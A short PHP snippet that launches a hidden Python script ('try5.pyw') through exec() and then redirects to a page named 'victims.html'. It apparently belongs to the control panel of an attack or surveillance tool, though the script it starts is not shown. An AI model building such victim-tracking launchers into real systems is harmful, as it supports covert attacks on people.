<?php
// Executes, returns only last line of the output
echo exec("start try5.pyw");
?>
<meta http-equiv="Refresh" content="0; url='../../victims.html'" />
